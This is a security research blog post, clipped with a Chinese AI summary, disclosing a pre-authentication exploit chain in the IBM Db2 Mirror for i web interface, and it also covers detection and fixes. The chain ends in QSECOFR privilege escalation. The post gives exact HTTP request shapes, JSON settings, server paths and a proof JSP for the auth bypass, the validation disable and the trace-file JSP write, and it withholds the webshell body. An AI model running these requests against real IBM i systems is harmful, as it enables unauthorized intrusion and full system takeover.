---
title: "IBM Db2 Mirror for i: pre-auth RCE and the road to QSECOFR"
source: https://blog.silentsignal.eu/2026/09/14/IBM-Db2-Mirror-for-i-pre-auth-RCE-and-the-road-to-QSECOFR/
source_host: blog.silentsignal.eu
clip_date: 2026-11-13T10:36:01+08:00
trace_id: 53580600-73a5-4c87-9874-cb45d0c90fee
content_hash: 511be5b749b14e59bb15b316b60ed956f0dc4f708500da358fb887a0421ea23a
status: synced
tags:
  - Java安全
  - 漏洞分析
series: null
feed_source: Silent Signal·IBM i漏洞研究
ai_summary: |-
  - **单字符绕过认证：** `AuthFilter` 基于 `requestURI.split("/")` 且仅当第三段精确等于 `Db2MirrorServlet` 时执行认证检查；在 servlet 路径中插入分号路径参数（`/Db2MirrorServlet;x/...`）导致过滤条件不匹配而跳过认证，但容器仍按映射将请求路由到该 servlet。
  - **未认证关闭输入校验：** 过滤器在认证检查前处理 `skipVald` 参数，任何未认证请求发送 `/?skipVald=true` 即可在会话中设置标志，使 servlet 跳过 `InputValidationUtil.validateRequestParameters()`，绕过所有注解正则校验。
  - **读→写→JSP 执行链：** `LogAction.getLogFileContent()` 的 `path` 参数仅匹配路径字符、无目录限制，构成任意文件读取（用于定位 Liberty server.xml/jvm.options）；`updateLogSetting()` 可将 IBM Toolbox `Trace.setFileName()` 指向展开 WAR 下的任意 JSP 路径，再借 `SetupAction.verifyConnection` 的 `hostname` 参数携带 JSP 内容触发 Toolbox 追踪写入，请求该 JSP 即获得 Liberty 内代码执行。
  - **jvm.options 持久化注入：** 同一 `updateLogSetting` 将 `guiLogLevel` 直接拼接到 `-Dcom.ibm.DB2Mirror.level=` 后写入 `jvm.options`；校验被禁用时换行符可注入额外 JVM 启动参数，构成重启后持久化的第二 RCE 向量。
  - **提权至 QSECOFR：** 通过反射加载应用内 `com.ibm.lwi.hatmanager.nativ.NativeMethods` 并调用 `doMethod()`（加载本地库 QLWIUTIL3），使本地 `jdbc:db2:*LOCAL` 连接的当前用户变为 QSECOFR，将 web RCE 升级为 IBM i 最高权限系统沦陷。
ai_summary_style: key-points
images_status:
  total: 0
  succeeded: 0
  failed_urls: []
notion_page_id: 41775244-d011-817c-b8e4-db29e1d87e57
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> - **单字符绕过认证：** `AuthFilter` 基于 `requestURI.split("/")` 且仅当第三段精确等于 `Db2MirrorServlet` 时执行认证检查；在 servlet 路径中插入分号路径参数（`/Db2MirrorServlet;x/...`）导致过滤条件不匹配而跳过认证，但容器仍按映射将请求路由到该 servlet。
> - **未认证关闭输入校验：** 过滤器在认证检查前处理 `skipVald` 参数，任何未认证请求发送 `/?skipVald=true` 即可在会话中设置标志，使 servlet 跳过 `InputValidationUtil.validateRequestParameters()`，绕过所有注解正则校验。
> - **读→写→JSP 执行链：** `LogAction.getLogFileContent()` 的 `path` 参数仅匹配路径字符、无目录限制，构成任意文件读取（用于定位 Liberty server.xml/jvm.options）；`updateLogSetting()` 可将 IBM Toolbox `Trace.setFileName()` 指向展开 WAR 下的任意 JSP 路径，再借 `SetupAction.verifyConnection` 的 `hostname` 参数携带 JSP 内容触发 Toolbox 追踪写入，请求该 JSP 即获得 Liberty 内代码执行。
> - **jvm.options 持久化注入：** 同一 `updateLogSetting` 将 `guiLogLevel` 直接拼接到 `-Dcom.ibm.DB2Mirror.level=` 后写入 `jvm.options`；校验被禁用时换行符可注入额外 JVM 启动参数，构成重启后持久化的第二 RCE 向量。
> - **提权至 QSECOFR：** 通过反射加载应用内 `com.ibm.lwi.hatmanager.nativ.NativeMethods` 并调用 `doMethod()`（加载本地库 QLWIUTIL3），使本地 `jdbc:db2:*LOCAL` 连接的当前用户变为 QSECOFR，将 web RCE 升级为 IBM i 最高权限系统沦陷。

This is a write-up of a bug chain in the IBM Db2 Mirror for i web interface. The chain starts without authentication, reaches arbitrary Java/JSP execution in the Liberty application server, and can then cross into QSECOFR on the local IBM i system.

I am not publishing the JSP payload body or a one-command exploit here. The point of this post is the vulnerability mechanics: why the checks failed, which application features became primitives, and how those primitives were chained.

The tested target was a Db2 Mirror GUI WAR deployed on the IBM i administrative Liberty instance. The lab system was IBM i V7R5. The GUI build timestamp in the test environment was from late 2025.

## The application shape

The WAR is a fairly typical Java administrative application. The frontend is Angular, but almost everything interesting goes through a single servlet:

```java
@WebServlet(value={"/Db2MirrorServlet/*"})
public class Db2MirrorServlet extends HttpServlet
```

The servlet does not contain the business logic itself. It uses a URL segment as a class name and a request parameter as a method name. In bytecode, the dispatcher does roughly this:

```java
String function = request.getParameter("function");
String uri = request.getRequestURI().substring(1);
if (uri.endsWith("/")) {
    uri = uri.substring(0, uri.lastIndexOf("/"));
}
String[] parts = uri.split("/");

String className = "com.ibm.DB2Mirror.action." + parts[2];
Class<?> actionClass = Class.forName(className);
Constructor<?> ctor = actionClass.getConstructor(
    Db2mHttpServletRequestWrapper.class,
    HttpServletResponse.class
);
Method actionMethod = actionClass.getDeclaredMethod(function);
Object action = ctor.newInstance(request, response);
```

After this it performs optional authority and validation checks, then invokes the selected action method.

This means a normal backend call has the following logical shape:

```
/Db2MirrorServlet/<ActionClass>?function=<methodName>
```

For example, the GUI can call `LogAction.getLogFileContent()` by asking the servlet to instantiate `com.ibm.DB2Mirror.action.LogAction` and invoke `getLogFileContent`.

The web application also has a global authentication filter in `WEB-INF/web.xml`:

```xml
<filter>
    <filter-name>AuthFilter</filter-name>
    <filter-class>com.ibm.DB2Mirror.utils.AuthFilter</filter-class>
</filter>

<filter-mapping>
    <filter-name>AuthFilter</filter-name>
    <url-pattern>/*</url-pattern>
</filter-mapping>
```

So the intended model is clear: all requests enter `AuthFilter`, and only authenticated sessions should reach dangerous action functions.

That was not what happened.

The reversing workflow was simple:

-   unzip Db2Mirror.war
-   inspect WEB-INF/web.xml
-   decompile com.ibm.DB2Mirror.utils.AuthFilter
-   decompile com.ibm.DB2Mirror.action.Db2MirrorServlet
-   fall back to javap -p -c when CFR failed on the dispatcher
-   grep action classes for request.getParameter(), FileInputStream, FileWriter, Trace.setFileName()

CFR failed to decompile `Db2MirrorServlet.doGet(Db2mHttpServletRequestWrapper, HttpServletResponse)` cleanly, but `javap -p -c` was enough. The bytecode showed the full reflection flow: read `function`, split the URI, build `com.ibm.DB2Mirror.action.<segment>`, instantiate the action with `(request, response)`, validate unless `skipVald` is set, then invoke the method.

That bytecode view was also useful because it showed where the validation check happened relative to reflection. The action class and method are resolved before validation. Validation only controls parameter content, not which action function can be selected.

## Bug 1: authentication based on the wrong path view

`AuthFilter` reads the raw request URI and splits it manually:

```java
String requestURI = hRequest.getRequestURI();
String requestCtxPath = hRequest.getContextPath();
...
String[] rets = requestURI.split("/");
```

The security checks for the main servlet are only executed when the third segment equals `Db2MirrorServlet` exactly:

```java
if (rets[2].equals("Db2MirrorServlet")) {
    if (!this.isAllowedWithoutSession(request.getParameter("function"))
        && !this.isAuthenticated(hSession)) {
        hResponse.sendError(401);
        return;
    }

    String buildTimeStampInRequest = hRequest.getHeader("BuildTimeStamp");
    if (Db2MirrorConfig.getInstance().getBuildTimeStamp() != null
        && !allowedServiceWithoutBuildTimeStamp.contains(request.getParameter("function"))
        && !Db2MirrorConfig.getInstance().getBuildTimeStamp().equalsIgnoreCase(buildTimeStampInRequest)) {
        hResponse.setHeader("Code", "BT");
        hResponse.sendError(403);
        return;
    }

    if (!allowedServiceWithoutMn.contains(request.getParameter("function"))
        && !this.isMnMatched(hRequest.getHeader("MN"), hSession)) {
        hResponse.setHeader("Code", "MN");
        hResponse.sendError(403);
        return;
    }
}
```

There are actually three protections in that block: authenticated session, build timestamp header, and the `MN` one-time value. All three depend on the same fragile `rets[2].equals("Db2MirrorServlet")` condition.

Servlet path parameters break the assumption. A request can include a semicolon parameter on the servlet path:

```
GET /Db2MirrorServlet;x/DbmConfigAction?function=getAppInitData HTTP/1.1
```

The filter sees segment 2 as:

```
Db2MirrorServlet;x
```

That does not equal `Db2MirrorServlet`, so the authentication block is skipped.

The servlet container still routes the request to `Db2MirrorServlet`, because the path parameter does not stop the servlet mapping from matching. Then the servlet’s own dispatcher strips the leading slash and splits the URI. With the deployed context path included, the servlet still obtains the action class from the next segment:

```kotlin
<context>/Db2MirrorServlet;x/DbmConfigAction
          ^ filter misses this          ^ servlet uses this as class
```

This is the first primitive: protected action methods can be reached without a valid GUI login, without the `BuildTimeStamp` header, and without a valid `MN` value.

The harmless proof was to call an initialization function and read the returned build metadata. The useful consequence was much broader: any action method that did not perform its own strong authorization became reachable.

The first request in the lab was intentionally boring:

```
GET /Db2MirrorServlet;x/DbmConfigAction?function=getAppInitData HTTP/1.1
Host: target
```

The expected unauthenticated response is a JSON response object containing application initialization data. A normal protected function without the semicolon path parameter returns 401 or 403 because the filter asks for the GUI session, build timestamp, and `MN` value.

Once this worked, the rest of the exploit stayed on the same pattern:

```
/Db2MirrorServlet;x/<ActionClass>?function=<methodName>&...
```

## Bug 2: the unauthenticated validation bypass switch

The next problem is that `AuthFilter` processes several debug/session options before the servlet-specific authentication check.

One of them is `skipVald`:

```java
if ((skipVald = request.getParameter("skipVald")) != null) {
    LogWriter.trace("skipVald=" + skipVald);
    if (skipVald.equalsIgnoreCase("yes")
        || skipVald.equalsIgnoreCase("y")
        || skipVald.equalsIgnoreCase("true")) {
        AdminSession.currentSession(hSession).setSkipVald(true);
    } else if (skipVald.equalsIgnoreCase("false")
        || skipVald.equalsIgnoreCase("no")
        || skipVald.equalsIgnoreCase("n")) {
        AdminSession.currentSession(hSession).setSkipVald(false);
    }
}
```

`AdminSession.currentSession(hSession)` creates or retrieves an `AdminSession` object for the current HTTP session. No login is required for setting this flag. The stored value is just a boolean:

```java
private boolean skipVald = false;

public boolean isSkipVald() {
    return this.skipVald;
}

public void setSkipVald(boolean skipVald) {
    this.skipVald = skipVald;
}
```

The servlet dispatcher checks this flag immediately before calling the validation layer. From the bytecode:

```java
if (!adminSession.isSkipVald()) {
    inputValidationUtil.validateRequestParameters(request, actionMethod);
}
```

If `skipVald` is true, `InputValidationUtil.validateRequestParameters()` is not called.

This matters because Db2 Mirror has a real annotation-based validation layer. For example, `LogAction.updateLogSetting()` expects its `logSetting` parameter to be parsed as a `LogSetting` object:

```java
@ParmValidationObject(name="logSetting", className=LogSetting.class)
public ResponseObject updateLogSetting()
```

The fields inside `LogSetting` have regular expressions:

```java
@FieldValidation(regex="^[a-zA-Z0-9:\\\\\\-_./]*$")
private String javaToolboxTraceFile;

@FieldValidation(regex="^[a-zA-Z0-9\"\\$\\*\\-\\.\\+_/#@:%! ]*$")
private String guiLogLevel;
```

Those patterns are restrictive enough to block several characters needed for the later file-write and JVM-option tricks. But the attacker can first make a pre-auth request that sets `skipVald=true`, keep the same HTTP session cookie, and then call the interesting action methods through the path-parameter auth bypass.

The exploitation sequence at this stage is:

1.  Start an unauthenticated session.
2.  Send any request with skipVald=true so AuthFilter stores it in AdminSession.
3.  Reuse the same session cookie.
4.  Call protected action methods through /Db2MirrorServlet;x/.

There is no need to know a username, password, build timestamp, or `MN` value.

The important implementation detail is that `skipVald` is set by `AuthFilter`, not by the protected servlet. This means it can be set using any route that passes through the filter and creates a session. The exploit then reuses the `JSESSIONID` cookie for the protected action calls.

Reduced request shape:

```
GET /?skipVald=true HTTP/1.1
Host: target
```

or, equivalently, any other request that reaches the filter and carries the same parameter. After this, the session-side `AdminSession.skipVald` bit remains true until it is changed or the session expires.

## Bug 3: arbitrary file read hidden behind “log file” wording

The first useful action was `LogAction.getLogFileContent()`:

```java
@ParmValidationPrimitive(name="path", regex="^[a-zA-Z0-9:\\\\\\-_./]*$")
public ResponseObject getLogFileContent() {
    String path = this.request.getParameter("path");
    StringBuffer buf = new StringBuffer();
    File logFile = new File(path);

    if (!logFile.exists()) {
        this.response.sendError(404);
    } else {
        rdr = new BufferedReader(new InputStreamReader(
            (InputStream)new FileInputStream(path), "UTF8"));
        ...
        ro.setData(buf.toString());
    }
}
```

The annotation says `path` should match a path-looking regex. It does not restrict the path to a log directory. The implementation opens whatever file the server profile can read.

Because the servlet-level auth block has already been bypassed, this becomes an unauthenticated arbitrary file read in the context of the Liberty process.

The file read primitive was used for orientation, not for the final RCE directly. The useful files were:

```
<Liberty server>/server.xml
<Liberty server>/jvm.options
<Liberty server>/logs/messages.log
/QIBM/ProdData/QDB2MIR/MRDB/GUI/Db2Mirror.xml
```

On the test target the Liberty server directory was:

```
/QIBM/UserData/OS/AdminInst/admin3/wlp/usr/servers/admin3
```

and the expanded Db2 Mirror application was:

```swift
/QIBM/UserData/OS/AdminInst/admin3/wlp/usr/servers/admin3/apps/expanded/Db2Mirror.war
```

The exploit did not need these exact paths hard-coded forever. It could first try common case variants such as `admin3` and `Admin3`, read `server.xml`, and then derive the expanded WAR path from the Liberty layout.

## Bug 4: turning trace configuration into a write primitive

The write primitive came from `LogAction.updateLogSetting()`, which is meant to update GUI and IBM Toolbox logging settings.

The method parses JSON from a request parameter:

```java
String jsonLogSetting = this.request.getParameter("logSetting");
LogSetting logSetting = (LogSetting)g.fromJson(jsonLogSetting, LogSetting.class);
```

It then saves the new settings to `jvm.options`:

```java
this.saveLogSettingToConfig(logSetting);
```

and applies part of the setting to the running JVM:

```java
if (logSetting.isJavaToolboxTrace()) {
    Trace.setTraceAllOn((boolean)true);
    Trace.setTraceOn((boolean)true);
    Trace.setFileName((String)logSetting.getJavaToolboxTraceFile());
} else {
    Trace.setTraceAllOn((boolean)false);
    Trace.setTraceOn((boolean)false);
}
```

The persistence function constructs the target `jvm.options` path from `user.dir`:

```java
String jvmOptionsFileName =
    System.getProperty("user.dir") + File.separator + "jvm.options";
```

It removes existing Db2 Mirror trace/logging entries and appends the caller-controlled values:

```java
if (logSetting.isJavaToolboxTrace()) {
    sb.append("-Dcom.ibm.as400.access.Trace.category=ALL");
    sb.append(System.getProperty("line.separator", "\n"));
    sb.append("-Dcom.ibm.as400.access.Trace.file="
        + logSetting.getJavaToolboxTraceFile());
    sb.append(System.getProperty("line.separator", "\n"));
}

sb.append("-Dcom.ibm.DB2Mirror.level=" + logSetting.getGuiLogLevel());
sb.append(System.getProperty("line.separator", "\n"));
sb.append("-Dcom.ibm.db2mirror.toolkit.level=" + logSetting.getToolkitLogLevel());
```

There are two separate problems here.

The first is immediate: `Trace.setFileName()` accepts the trace file path from the HTTP request. If Java Toolbox tracing is enabled, subsequent Toolbox activity writes to that file.

The second is persistent: the same value is written to `jvm.options`, so a malicious or corrupted setting can survive restart.

With validation enabled, `javaToolboxTraceFile` would be limited by its regex. With `skipVald=true`, the attacker can place the trace file wherever the Liberty profile can write.

At this point the chain has a write primitive with these constraints:

-   The attacker controls the trace file path.
-   The attacker can trigger Toolbox activity.
-   The attacker can influence data that appears in the trace.
-   The trace framework adds metadata around the data.
-   The write runs as the Liberty web application user.

That is not a perfect arbitrary write, but it is enough for formats that can tolerate extra bytes or where the meaningful content can be positioned in a parseable region.

For exploitation, there is no need to write a separate test file first. The trace destination can be set directly to a JSP path under the expanded WAR.

The attacker chooses a filename that does not collide with the product, for example:

```
<expanded Db2Mirror.war>/proof.jsp
```

That path is then supplied as `javaToolboxTraceFile`.

```
GET /Db2MirrorServlet;x/LogAction?function=updateLogSetting&logSetting=<json> HTTP/1.1
Host: target
Cookie: JSESSIONID=<session-with-skipVald>
```

The JSON object had this shape:

```json
{
  "javaToolboxTrace": true,
  "javaToolboxTraceFile": "<expanded Db2Mirror.war>/proof.jsp",
  "guiLogLevel": "INFO",
  "toolkitLogLevel": "FINEST",
  "flightRecorderStorageWarn": "70",
  "flightRecorderStorageCritical": "90"
}
```

`proof.jsp` is not a pre-existing product file. It is created because the exploit asks the application to use that path as the Java Toolbox trace file. The write sequence is:

1.  updateLogSetting(javaToolboxTrace=true, javaToolboxTraceFile= /proof.jsp)
2.  LogAction calls Trace.setFileName(“ /proof.jsp")
3.  a later Toolbox operation emits trace data
4.  jt400/Toolbox creates or updates proof.jsp
5.  Liberty compiles proof.jsp when it is requested

If the trace file path points into the web application directory and the controlled trace content contains valid JSP, Liberty treats the newly created file as application code.

## From trace write to JSP

The obvious target was the expanded WAR directory.

Liberty was serving the application from:

```
.../apps/expanded/Db2Mirror.war
```

If a JSP file appears in that directory, the server compiles it and serves it inside the Db2 Mirror application context. The attacker-created filename can be anything that does not collide with the product; `proof.jsp` was just the lab name. This turns a write-to-webroot primitive into Java code execution.

The exploitation process was:

First, establish an unauthenticated HTTP session and set `skipVald=true`.

Then, through the semicolon auth bypass, call `LogAction.updateLogSetting()` with a `logSetting` object that enables Java Toolbox tracing and points `javaToolboxTraceFile` at a new `.jsp` path under the expanded WAR.

Next, call a backend function that makes IBM Toolbox log trace data. The function used in the lab was `SetupAction.verifyConnection`, with the JSP text supplied as the `hostname` parameter.

The relevant source is small:

```java
@ParmValidationPrimitive(name="hostname", regex="^[a-zA-Z0-9-_.]*$")
public ResponseObject verifyConnection() throws Db2mDbException, Db2mAS400Exception {
    ResponseObject ro = new ResponseObject();
    String hostname = this.request.getParameter("hostname");
    LogWriter.info("Verifying " + hostname + " connection ");
    boolean okConnect = DbConnection.isJdbcServiceActive(hostname);
    ro.setData(okConnect);
    return ro;
}
```

`DbConnection.isJdbcServiceActive()` then passes that string into IBM Toolbox:

```java
public static boolean isJdbcServiceActive(String host) {
    AS400JPing jping = new AS400JPing(host);
    jping.setTimeout(5000L);
    return jping.ping(4);
}
```

Normally the `hostname` regex would block JSP metacharacters. With `skipVald=true`, the servlet skips that validation and the value reaches `AS400JPing`. Since `updateLogSetting()` already enabled Toolbox tracing and pointed the trace file at `<expanded WAR>/proof.jsp`, the Toolbox trace output is written into that JSP file.

The trigger request has this shape:

```
GET /Db2MirrorServlet;x/SetupAction?function=verifyConnection&hostname=<urlencoded-jsp> HTTP/1.1
Host: target
Cookie: JSESSIONID=<session-with-skipVald>
```

`<urlencoded-jsp>` is the JSP proof body, URL-encoded as a parameter value. The request is expected to fail or return `false` as a connection test; success of the connection test is irrelevant. The important side effect is that `AS400JPing` runs with the supplied string while Toolbox tracing is writing to the attacker-selected JSP path.

Finally, request the generated JSP from the application. If the JSP survived the trace wrapper and compiled, the response proves code execution in the Liberty JVM.

The important implementation details are:

-   updateLogSetting() controls Trace.setFileName()
-   Trace output is written by the web process
-   expanded WAR directories are executable JSP locations
-   the same unauthenticated session can combine skipVald and the servlet bypass

The first shell runs as the administrative web profile, not as QSECOFR. That still gives a lot: filesystem access in the administrative instance, local process execution through Java, application modification, and access to configuration files.

## Building the JSP proof

The part that took a few iterations was not “can Liberty execute JSP?” That part was expected. The annoying bit was shaping a JSP so it still compiled after being written through a trace file.

The trace primitive is not the same as `write(path, bytes)`. It produces a file that contains trace framing and then the attacker-controlled string. In practice this means the payload has to be tolerant of bytes before or after the useful section.

The JSP proof payload can be kept simple:

```go
<%
out.println("DB2MIRROR_JSP_OK");
out.println("date=" + new java.util.Date().toString());
out.println("java.user=" + java.lang.System.getProperty("user.name"));
out.println("java.home=" + java.lang.System.getProperty("java.home"));
out.println("server.info=" + application.getServerInfo());
%>
```

This proves arbitrary server-side Java execution without turning the post into a published webshell. The marker makes the useful output easy to find in the response, and the Java properties prove execution happened on the server.

The HTTP-level flow is:

1.  Choose an unused JSP filename under the expanded WAR, for example proof.jsp.
2.  Set javaToolboxTraceFile to that full IFS path with updateLogSetting().
3.  Call SetupAction.verifyConnection with the JSP text URL-encoded in the hostname parameter.
4.  Disable tracing or restore the previous log setting with updateLogSetting().
5.  Request /Db2Mirror/proof.jsp.
6.  Look for DB2MIRROR_JSP_OK and the server-side Java properties in the response.

The restore call uses the same action as the exploit. The clean version is to read the current setting before changing it:

```
/Db2MirrorServlet;x/LogAction?function=getLogSetting
```

Save the returned `data` object. After the JSP has been written, send that object back to:

```
/Db2MirrorServlet;x/LogAction?function=updateLogSetting&logSetting=<original-json>
```

If the original setting was not saved, the minimum cleanup is to turn Toolbox tracing off and move the trace path back to a normal log location:

```json
{
  "javaToolboxTrace": false,
  "javaToolboxTraceFile": "<Liberty server>/logs/javaToolboxTrace.txt",
  "guiLogLevel": "INFO",
  "toolkitLogLevel": "FINEST",
  "flightRecorderStorageWarn": "70",
  "flightRecorderStorageCritical": "90"
}
```

`updateLogSetting()` will call:

```java
Trace.setTraceAllOn(false);
Trace.setTraceOn(false);
```

and it will rewrite `jvm.options` with the supplied values. This matters because the trace configuration is not only runtime state; it is also persisted.

The resulting response is not expected to be pretty. Trace prefix/suffix text may appear around the JSP output. The important part is seeing the marker and server-side values, for example:

```
DB2MIRROR_JSP_OK
date=<server-side date>
java.user=<Liberty process user>
java.home=<JVM path>
server.info=<Liberty/Tomcat JSP engine string>
```

This confirms four things at once:

-   The file was written under the expanded WAR.
-   Liberty treated the file as JSP, not static text.
-   The JSP compiler accepted the file.
-   The resulting code ran inside the Db2 Mirror JVM.

If the response contains only trace text and the JSP source appears literally, the file is being served as static content or the extension/path is wrong. If the response is a JSP compilation error, the payload did not survive the trace wrapper. If the response is 404, either the path is wrong, Liberty has not noticed the new file, or the file was not created by the trace code.

After this proof, command execution is only a change in the JSP body: instead of printing Java properties, the JSP reads a request parameter, passes it to a Java process execution API, and streams the process output back to the HTTP response. I am intentionally not including that webshell body here. It is a small snippet and would turn this post into a copy-paste unauthenticated RCE exploit.

## Exploit flow in one place

Putting the pieces together, the benign JSP execution proof uses this request order.

First, create a session and turn off validation:

```
GET /?skipVald=true HTTP/1.1
Host: target
```

Keep the returned `JSESSIONID`.

Next, discover the Liberty server path if it is not already known. The usual path on the tested system was:

```
/QIBM/UserData/OS/AdminInst/admin3/wlp/usr/servers/admin3
```

The expanded Db2 Mirror WAR was then:

```swift
/QIBM/UserData/OS/AdminInst/admin3/wlp/usr/servers/admin3/apps/expanded/Db2Mirror.war
```

If the case differs, use the file-read primitive against `server.xml` and `jvm.options` to confirm the path.

Now enable Toolbox tracing and set the trace destination directly to the JSP file:

```
GET /Db2MirrorServlet;x/LogAction?function=updateLogSetting&logSetting=<urlencoded-json> HTTP/1.1
Host: target
Cookie: JSESSIONID=<same-session>
```

The decoded JSON is:

```json
{
  "javaToolboxTrace": true,
  "javaToolboxTraceFile": "/QIBM/UserData/OS/AdminInst/admin3/wlp/usr/servers/admin3/apps/expanded/Db2Mirror.war/proof.jsp",
  "guiLogLevel": "INFO",
  "toolkitLogLevel": "FINEST",
  "flightRecorderStorageWarn": "70",
  "flightRecorderStorageCritical": "90"
}
```

Then trigger Toolbox tracing with the JSP proof body as the `hostname` parameter:

```
GET /Db2MirrorServlet;x/SetupAction?function=verifyConnection&hostname=<urlencoded-jsp> HTTP/1.1
Host: target
Cookie: JSESSIONID=<same-session>
```

The decoded JSP is:

```go
<%
out.println("DB2MIRROR_JSP_OK");
out.println("date=" + new java.util.Date().toString());
out.println("java.user=" + java.lang.System.getProperty("user.name"));
out.println("java.home=" + java.lang.System.getProperty("java.home"));
out.println("server.info=" + application.getServerInfo());
%>
```

The `verifyConnection` response itself is not the proof. It can return `false` or an error. The relevant side effect is that IBM Toolbox tracing writes the supplied hostname string into `proof.jsp`.

Finally, request the JSP:

```
GET /proof.jsp HTTP/1.1
Host: target
```

Depending on the deployed context, the browser-visible path may instead be:

```
/Db2Mirror/proof.jsp
```

A successful proof contains `DB2MIRROR_JSP_OK` and server-side Java property values. After that, restore the original log setting or at least disable Toolbox tracing with `updateLogSetting()`.

For reversing and exploit development, the important point is where the command-execution sink sits in the chain:

1.  HTTP request parameter
2.  JSP request object
3.  Java process execution API
4.  PASE shell or IBM i command bridge
5.  Output stream copied to JSP response

On IBM i there are two practical command layers to think about. PASE commands run through the Unix-like environment. CL commands are reached through IBM i mechanisms such as `system` from PASE, SQL services, or a native/Toolbox bridge. The first webshell does not need to understand all of that. It only needs enough Java execution to bootstrap a better primitive.

The important practical issue is not inventing a separate proof file. It is making the JSP tolerate the trace wrapper. If the generated JSP does not compile, the problem is usually the expanded WAR path, file permissions, or JSP syntax after trace metadata has been added.

## A second write angle: jvm.options injection

The trace path was the shortest route to immediate JSP execution, but `saveLogSettingToConfig()` also created a persistence angle.

The code appends `guiLogLevel` directly after a JVM property prefix:

```java
sb.append("-Dcom.ibm.DB2Mirror.level=" + logSetting.getGuiLogLevel());
```

With validation disabled, a newline in `guiLogLevel` can add extra lines to `jvm.options`. Those extra lines become JVM arguments on the next Liberty restart.

This is not as immediate as the JSP route, but it is important for impact analysis. Depending on the allowed runtime, classpath, and restart behavior, injected JVM options can alter process behavior, load additional agents, or expose management interfaces. In the exploit tooling this was treated as a separate persistent RCE vector, but for the public write-up the important part is the root cause: untrusted request data was written into a JVM options file after validation had been disabled by an unauthenticated session flag.

## Privilege escalation: why QSECOFR entered the picture

At this stage we had code execution as the Liberty web profile. On many platforms that would be the end of the post. On IBM i, the more interesting question is usually whether the web job can reach adopted authority or native helpers.

The WAR contained this class:

```java
package com.ibm.lwi.hatmanager.nativ;

public class NativeMethods {
    public static native int doMethod();

    static {
        System.loadLibrary("QLWIUTIL3");
    }
}
```

The class is small, but its context matters. It loads native library `QLWIUTIL3` and exposes a static native method called `doMethod()`.

From a JSP executing inside the same Liberty application environment, Java reflection can load this class and invoke the static native method. In the lab this changed the effective IBM i context enough that a local Db2 connection reported QSECOFR.

The validation test for the privilege escalation was intentionally simple:

1.  Execute Java code inside the Db2 Mirror/Liberty process.
2.  Load com.ibm.lwi.hatmanager.nativ.NativeMethods.
3.  Invoke doMethod().
4.  Open jdbc:db2:\*LOCAL.
5.  Query the current SQL user.

Before the native call, the shell represented the web application context. After the native call, the local Db2 connection identified as QSECOFR in the tested environment.

That turns the issue from web application RCE into system compromise. QSECOFR is the highest authority profile on IBM i.

## Reproducing safely in a lab

The minimum safe lab flow is:

-   Confirm the unauthenticated servlet bypass with a harmless metadata function.
-   Set skipVald=true and verify the same session can still call protected actions.
-   Use updateLogSetting to redirect Toolbox trace output to a JSP path under the expanded WAR.
-   Trigger a Toolbox operation carrying the JSP content.
-   Request the generated JSP and confirm server-side execution.
-   After code execution, test identity before and after invoking NativeMethods.doMethod().
-   Clean up generated files and restore jvm.options.

The cleanup step is important because `updateLogSetting()` persists changes to `jvm.options`. A failed test can leave Toolbox tracing enabled or point the trace file at a strange location. In a real assessment, record the original `jvm.options` first and restore it after testing.

## Detection

The clearest network indicator is a semicolon in the Db2 Mirror servlet path:

```
/Db2MirrorServlet;.../
```

That is not a normal GUI route. Requests combining this pattern with `skipVald`, `LogAction`, `getLogFileContent`, `updateLogSetting`, or setup/connection verification functions should be treated as suspicious.

On disk, inspect the expanded application directories for new JSP files. In the tested layout the main locations were:

```bash
/QIBM/UserData/OS/AdminInst/admin3/wlp/usr/servers/*/apps/expanded/Db2Mirror.war/
/QIBM/UserData/OS/AdminInst/admin3/wlp/usr/servers/*/apps/expanded/dcm.war/
```

Also check `jvm.options` for unexpected entries:

```
-Dcom.ibm.as400.access.Trace.category=ALL
-Dcom.ibm.as400.access.Trace.file=<unexpected path>
```

If the trace file points into an application directory, treat it as compromise until proven otherwise.

For IBM i auditing, review web jobs for unusual local Db2 connections, profile switching behavior, and command execution initiated from the administrative Liberty instance. If QSECOFR appears in activity that originated from the web tier, that is a serious escalation signal.

## Fixes

The primary fix is to apply IBM’s product PTFs when available. The engineering fixes are straightforward but need to be applied together.

The filter should not authorize based on `requestURI.split("/")`. It should use container-normalized servlet information and reject unexpected path parameters on protected routes. Authentication, build timestamp, and `MN` checks should not be inside a branch that can be skipped by changing the textual representation of the servlet path.

Session flags such as `skipVald`, `devMode`, and `skipTimeout` should not be controllable by unauthenticated users. In production they should probably not be controllable through HTTP at all.

Validation should fail closed. A request parameter should not be able to tell the dispatcher to skip `InputValidationUtil.validateRequestParameters()`.

File reads should be confined to an allowlisted directory and should resolve canonical paths before opening files.

Trace file paths should be server-side choices, not arbitrary client input. If users need to select a trace destination, the selection should be from a fixed set of directories and filenames.

Expanded WAR directories should be treated as code, not storage. The web profile should not be able to write new executable JSPs there during normal operation.

Finally, privileged native helpers should not be reachable from web application code unless there is a hard authorization boundary around them. On IBM i, any bridge that can affect adopted authority or profile state must be treated as part of the security boundary.

## Conclusion

The chain was short because the application placed powerful administrative features behind a filter that could be confused with one character.

A path parameter skipped authentication. An unauthenticated session flag disabled validation. A log viewer read arbitrary files. A Toolbox trace setting wrote attacker-influenced data to an attacker-selected path. An expanded WAR turned that write into JSP execution. A native helper then moved the execution context to QSECOFR.

None of the individual components looked exotic. Together they were enough for pre-authentication RCE and full IBM i compromise.

And this application is far from an isolated case. The broader IBM i web ecosystem continues to expose serious security weaknesses across its web facing components and administrative interfaces. IBM’s own security disclosures over the past month provide a clear indication of the scale of the problem, with additional vulnerabilities and security fixes appearing across the IBM i web stack. What we found here should therefore not be viewed as an exceptional failure in a single product, but as another example of a much broader attack surface that has historically received far less security scrutiny than comparable enterprise platforms.
